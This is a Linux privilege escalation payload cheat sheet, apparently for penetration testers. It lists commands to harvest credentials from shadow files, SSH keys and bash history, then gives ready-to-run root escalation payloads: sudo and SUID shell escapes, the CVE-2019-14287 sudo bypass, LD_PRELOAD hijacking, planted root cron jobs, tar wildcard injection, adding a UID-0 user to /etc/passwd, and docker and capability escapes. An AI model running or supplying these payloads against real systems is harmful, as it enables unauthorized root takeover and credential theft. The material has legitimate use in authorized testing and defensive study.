# LINUX PRIVILEGE ESCALATION PAYLOADS

## Enumeration Reference

### System / Kernel Info

| Command | Purpose |
|---|---|
| `uname -a` | Kernel version — check against known kernel exploit CVEs |
| `cat /etc/os-release` | Distro and version |
| `cat /proc/version` | Kernel build info |
| `lscpu` | CPU architecture (relevant for exploit compilation) |
| `hostnamectl` | Combined OS/kernel/hostname summary |

### Users / Groups

| Command | Purpose |
|---|---|
| `id` | Current user's UID/GID and group memberships |
| `whoami` | Current effective user |
| `cat /etc/passwd` | List all users (world-readable on most systems) |
| `cat /etc/shadow` | Password hashes — only readable as root, worth checking anyway |
| `sudo -l` | List commands current user can run with sudo (often the fastest path to root) |
| `groups` | Group memberships — check for `docker`, `lxd`, `disk`, `adm` etc. |

### SUID / SGID / Capabilities

| Command | Purpose |
|---|---|
| `find / -perm -4000 -type f 2>/dev/null` | Find SUID binaries |
| `find / -perm -2000 -type f 2>/dev/null` | Find SGID binaries |
| `find / -perm -4000 -o -perm -2000 2>/dev/null` | Find both in one pass |
| `getcap -r / 2>/dev/null` | Find binaries with Linux capabilities set (e.g. `cap_setuid`) |
| `find / -writable -type d 2>/dev/null` | Find world-writable directories |

### Cron / Scheduled Tasks

| Command | Purpose |
|---|---|
| `cat /etc/crontab` | System-wide cron jobs |
| `ls -la /etc/cron.*` | Hourly/daily/weekly cron directories |
| `crontab -l` | Current user's cron jobs |
| `cat /var/spool/cron/crontabs/*` | Per-user cron jobs (if readable) |
| `find / -newer /etc/crontab 2>/dev/null` | Files modified after a known reference point — can reveal recent automation |

### Processes / Services / Network

| Command | Purpose |
|---|---|
| `ps aux` | Running processes — look for root processes invoking scripts/binaries you can write to |
| `netstat -tulpn` / `ss -tulpn` | Listening ports and owning processes |
| `cat /etc/services` | Reference for known service ports |
| `systemctl list-units --type=service` | Running services (some run as root and may be misconfigured) |

### Credentials / Config Files

| Location | Purpose |
|---|---|
| `~/.bash_history` | Often leaks plaintext commands/passwords |
| `~/.ssh/` | Private keys, authorized_keys, known_hosts |
| `/var/www/html/**/config.php` (or similar) | Web app DB credentials |
| `/etc/fstab` | NFS shares — check for `no_root_squash` |
| `find / -name "*.bak" -o -name "*.old" -o -name "*config*" 2>/dev/null` | Backup/config files that may contain secrets |
| `grep -r "password" /etc/ 2>/dev/null` | Quick credential grep across config |

## Privilege Escalation Vectors

### Sudo Misconfiguration

| Payload / Technique | Purpose |
|---|---|
| `sudo -l` then check [GTFOBins](https://gtfobins.github.io) for listed binaries | Confirms whether an allowed sudo command can be abused to spawn a root shell |
| `sudo vim -c ':!/bin/sh'` | If `vim` is sudo-allowed, escape to a root shell |
| `sudo find . -exec /bin/sh \; -quit` | If `find` is sudo-allowed, spawn a root shell via `-exec` |
| `sudo python3 -c 'import os; os.system("/bin/sh")'` | If `python3` is sudo-allowed, spawn a root shell |
| `sudo less /etc/profile` then `!/bin/sh` inside pager | If a pager (`less`/`more`) is sudo-allowed, escape via shell command |
| `sudo -u#-1 /bin/bash` | Exploits CVE-2019-14287 (sudo UID -1/4294967295 bypass) on vulnerable versions |

### SUID Binary Abuse

| Payload / Technique | Purpose |
|---|---|
| `/path/to/suid_binary -exec /bin/sh \;` | If a SUID binary like `find` is set, spawn a shell with elevated privilege |
| `LD_PRELOAD=/tmp/evil.so /path/to/suid_binary` | Forces a SUID binary to load and execute attacker-controlled shared code, if `LD_PRELOAD` isn't dropped for SUID execution |
| `LD_LIBRARY_PATH` hijack | Places a malicious library where a SUID binary will load it instead of the legitimate one |
| Check GTFOBins for the specific binary name | Many common binaries (`nmap`, `vim`, `python`, `tar`, `cp`) have documented SUID escalation paths |

### Cron Job Abuse

| Payload / Technique | Purpose |
|---|---|
| Edit a world-writable script referenced by root's crontab | Next cron run executes your payload as root |
| `echo '* * * * * root /tmp/shell.sh' >> /etc/crontab` | Plant a new root cron job (requires write access to crontab) |
| Wildcard injection: `tar czf backup.tar.gz *` in a cron script | Abuses tar's wildcard handling — craft filenames like `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` in the target directory to trigger code execution when tar's wildcard expands them |

### Kernel Exploits

| Technique | Purpose |
|---|---|
| Match `uname -a` output against known CVEs (e.g. Dirty Pipe, Dirty COW, PwnKit) | Identify if the running kernel/library version has a known local privilege escalation exploit |
| Compile and run a matched PoC exploit for the identified CVE | Direct kernel-level privilege escalation — verify target architecture and kernel headers first |
| `searchsploit linux kernel <version>` | Quickly check for matching local exploit-db entries |

### Writable /etc/passwd

| Payload | Purpose |
|---|---|
| `openssl passwd -1 -salt abc password123` | Generate a hash to insert into `/etc/passwd` |
| `echo 'root2:$1$abc$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd` | Adds a new UID-0 user if `/etc/passwd` is writable |
| `su root2` | Switch to the newly added root-equivalent user |

### Docker / LXD Group Membership

| Payload | Purpose |
|---|---|
| `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` | If user is in the `docker` group, mount host root filesystem inside a container and chroot into it as root |
| `lxc init ubuntu:18.04 test -c security.privileged=true` then mount host `/` | If user is in the `lxd` group, similarly escape via a privileged container |

### NFS no_root_squash

| Payload | Purpose |
|---|---|
| Check `/etc/exports` on the NFS server for `no_root_squash` | Confirms root-owned files written from a client will retain root ownership |
| Mount the share, create a SUID binary as root from another machine, then execute it locally | Achieves local privilege escalation by abusing the trust relationship |

### Capabilities Abuse

| Payload / Technique | Purpose |
|---|---|
| `getcap -r / 2>/dev/null` then check binary against GTFOBins capabilities list | Identify binaries with `cap_setuid`, `cap_setgid`, or similar that can be abused |
| `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` | If `python3` has `cap_setuid+ep`, escalate directly via the capability |

## EXAMPLE PAYLOADS

```
find . -exec /bin/sh \; -quit
```
```
echo 'os.execl("/bin/sh", "sh", "-c", "exec /bin/sh")' | sudo python3
```
```
LD_PRELOAD=/tmp/evil.so /usr/bin/suid_binary
```
```
echo 'eve2:$6$abcd$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
```
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
```
* * * * * root /bin/bash /tmp/.shell.sh
```
```
tar czf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=/bin/sh *
```

## Tooling Note
Manual enumeration builds understanding of the target, but automate the sweep with `LinPEAS`, `linux-exploit-suggester`, or `linux-smart-enumeration` to catch what manual checks miss. Cross-reference any identified SUID/sudo binary against [GTFOBins](https://gtfobins.github.io) before assuming it's exploitable — exact flags/behavior vary by binary version. Stay within authorized scope — kernel exploits and `/etc/passwd` writes can crash or lock out a shared system.

## Quick Notes
- `sudo -l` and SUID enumeration are almost always the fastest wins — check those before reaching for a kernel exploit.
- Kernel exploits carry real stability risk (can crash the box) — prefer config-based escalation paths when both are available.
- Document the exact command/version that worked; many of these are highly version-specific and won't reproduce on a slightly different patch level.
